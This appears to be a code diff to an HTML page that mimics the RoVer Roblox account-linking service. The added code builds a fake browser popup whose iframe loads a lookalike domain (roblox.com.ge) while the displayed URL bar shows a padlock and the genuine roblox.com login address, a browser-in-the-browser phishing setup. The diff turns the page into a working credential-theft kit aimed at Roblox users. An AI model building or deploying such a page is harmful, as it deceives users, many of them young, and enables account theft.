@@ -2,18 +2,175 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>RoVer – Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
   <style>
-    body {
+    html, body {
+      height: 100%;
       margin: 0;
-      font-family: "Segoe UI", Roboto, sans-serif;
-      background: #1d1b1b;
-      color: white;
+      font-family: "Roboto", sans-serif;
+      background-color: #1d1b1b;
+      color: #fff;
     }
 
-    /* Button */
+    /* Navbar */
+    nav {
+      background-color: #c91673;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 24px;
+      font-size: 18px;
+      position: relative;
+    }
+
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .logo img {
+      height: 42px;
+      display: block;
+    }
+
+    nav a {
+      color: #fff;
+      text-decoration: none;
+      font-size: 16px;
+    }
+
+    nav a:hover {
+      text-decoration: underline;
+    }
+
+    .btn {
+      border: 1px solid #fff;
+      padding: 6px 12px;
+      border-radius: 6px;
+      background: none;
+      color: #fff;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      white-space: nowrap;
+    }
+
+    .btn:hover {
+      background-color: rgba(255, 255, 255, 0.15);
+    }
+
+    .username {
+      font-size: 14px;
+      font-weight: 700;
+      white-space: nowrap;
+      color: #fff;
+    }
+
+    /* Hamburger */
+    .hamburger {
+      display: none;
+      flex-direction: column;
+      cursor: pointer;
+      gap: 5px;
+    }
+
+    .hamburger span {
+      width: 24px;
+      height: 3px;
+      background: #fff;
+      border-radius: 2px;
+    }
+
+    /* Mobile menu */
+    .mobile-menu {
+      display: none;
+      flex-direction: column;
+      gap: 12px;
+      width: 100%;
+      padding: 12px 16px;
+      background: #c91673;
+    }
+
+    .mobile-menu.open {
+      display: flex;
+    }
+
+    /* Header - center panel vertically */
+    header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100%;
+      padding-top: 60px;
+      text-align: center;
+    }
+
+    /* Verification Panel */
+    .panel {
+      background: #000;
+      border-radius: 8px;
+      padding: 28px 20px;
+      max-width: 420px;
+      width: 95%;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.8);
+      text-align: left;
+    }
+
+    .panel h1 {
+      font-size: 26px;
+      font-weight: 800;
+      margin: 0 0 12px;
+    }
+
+    .redirect-text {
+      font-weight: bold;
+      font-size: 16px;
+      color: #ddd;
+      margin: 0 0 20px;
+      display: block;
+    }
+
+    .info-box {
+      display: flex;
+      align-items: flex-start;
+      background: #2c2c2c;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin: 0 0 20px;
+      text-align: left;
+      width: 100%;
+      box-sizing: border-box;
+      overflow-wrap: break-word;
+      word-break: break-word;
+    }
+
+    .info-box img {
+      width: 22px;
+      height: 22px;
+      margin-right: 10px;
+      margin-top: 2px;
+      flex-shrink: 0;
+    }
+
+    .info-box p {
+      font-size: 15px;
+      color: #ddd;
+      margin: 0;
+      line-height: 1.4;
+    }
+
     .login-btn {
+      margin-top: 20px;
       background: #c91673;
       color: #fff;
       padding: 12px 22px;
@@ -23,15 +180,48 @@
       font-weight: 600;
       cursor: pointer;
       transition: background 0.2s ease;
-      margin: 40px auto;
-      display: block;
+      width: 100%;
     }
 
     .login-btn:hover {
       background: #a1125f;
     }
 
-    /* Fake popup window */
+    @media (max-width: 768px) {
+      .nav-left,
+      .nav-right {
+        display: none;
+      }
+
+      .hamburger {
+        display: flex;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .panel {
+        padding: 20px 16px;
+      }
+
+      .panel h1 {
+        font-size: 22px;
+      }
+
+      .redirect-text {
+        font-size: 14px;
+      }
+
+      .info-box p {
+        font-size: 14px;
+      }
+
+      .login-btn {
+        font-size: 15px;
+        padding: 10px;
+      }
+    }
+
+    /* Fake popup styles */
     .fake-popup {
       display: none;
       position: fixed;
@@ -49,7 +239,6 @@
       border: 1px solid #ccc;
     }
 
-    /* Fake browser top bar */
     .window-bar {
       background: #e0e0e0;
       height: 36px;
@@ -73,7 +262,6 @@
       color: red;
     }
 
-    /* Fake URL bar */
     .url-bar {
       background: #f4f4f4;
       border: 1px solid #ccc;
@@ -88,14 +276,12 @@
       text-overflow: ellipsis;
     }
 
-    /* iFrame */
     .popup-iframe {
       width: 100%;
-      height: calc(100% - 76px); /* 36px bar + 10px margin + 30px URL */
+      height: calc(100% - 76px);
       border: none;
     }
 
-    /* Background overlay */
     .overlay {
       display: none;
       position: fixed;
@@ -108,26 +294,70 @@
   </style>
 </head>
 <body>
+  <!-- Navbar -->
+  <nav>
+    <div class="nav-left">
+      <div class="logo">
+        <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
+      </div>
+      <a href="#">Help</a>
+      <a href="#">Team Members</a>
+      <button class="btn">RoVer Plus</button>
+    </div>
+    <div class="nav-right">
+      <button class="btn">Manage Servers</button>
+      <a href="#" style="font-weight: 700">Verification</a>
+      <span class="username"></span>
+    </div>
+    <div class="hamburger" id="hamburger">
+      <span></span><span></span><span></span>
+    </div>
+  </nav>
 
-  <!-- Trigger button -->
-  <button class="login-btn" id="loginBtn">Log in with Roblox</button>
+  <!-- Mobile menu -->
+  <div class="mobile-menu" id="mobileMenu">
+    <a href="#">Help</a>
+    <a href="#">Team Members</a>
+    <button class="btn">RoVer Plus</button>
+    <button class="btn">Manage Servers</button>
+    <a href="#" style="font-weight: 700">Verification</a>
+    <span class="username"></span>
+  </div>
 
-  <!-- Overlay background -->
+  <!-- Verification Panel -->
+  <header>
+    <div class="panel" id="mockPanel">
+      <h1>Link Roblox Account</h1>
+      <span class="redirect-text">You will be redirected to Roblox.</span>
+      <div class="info-box">
+        <img src="https://img.icons8.com/ios-filled/50/1E90FF/info.png" alt="info" />
+        <p>If the next page says:<br>
+          <span style="color: #fff;">"You are not allowed to use this application"</span>, please read 
+          <span style="color: #c91673;">this help article</span>.
+        </p>
+      </div>
+      <button class="login-btn" id="loginBtn">Log in with Roblox</button>
+    </div>
+  </header>
+
+  <!-- Fake popup overlay -->
   <div class="overlay" id="overlay"></div>
 
-  <!-- Fake popup window -->
+  <!-- Fake browser popup -->
   <div class="fake-popup" id="fakePopup">
     <div class="window-bar">
       RoVer – Login
       <div class="popup-close" id="popupClose">&times;</div>
     </div>
-    <div class="url-bar" id="urlDisplay">https://www.roblox.com/login</div>
-    <iframe class="popup-iframe" id="popupIframe" src="https://www.roblox.com/login"></iframe>
+    <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/login</div>
+    <iframe class="popup-iframe" id="popupIframe" src=""></iframe>
   </div>
 
-  <!-- Script -->
   <script>
     const loginBtn = document.getElementById("loginBtn");
+    const hamburger = document.getElementById("hamburger");
+    const mobileMenu = document.getElementById("mobileMenu");
+
     const fakePopup = document.getElementById("fakePopup");
     const popupClose = document.getElementById("popupClose");
     const overlay = document.getElementById("overlay");
@@ -135,10 +365,11 @@
     const urlDisplay = document.getElementById("urlDisplay");
 
     loginBtn.addEventListener("click", () => {
-      // Optional: you can dynamically change the URL here
-      const loginUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
-      iframe.src = loginUrl;
-      urlDisplay.textContent = loginUrl;
+      const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
+      const fakeUrl = "https://www.roblox.com/login";
+
+      iframe.src = realUrl;
+      urlDisplay.innerHTML = "🔒 " + fakeUrl;
 
       fakePopup.style.display = "block";
       overlay.style.display = "block";
@@ -147,11 +378,12 @@
     popupClose.addEventListener("click", () => {
       fakePopup.style.display = "none";
       overlay.style.display = "none";
-      iframe.src = ""; // optionally clear iframe
+      iframe.src = "";
+    });
+
+    hamburger.addEventListener("click", () => {
+      mobileMenu.classList.toggle("open");
     });
   </script>
-
 </body>
 </html>
-
-
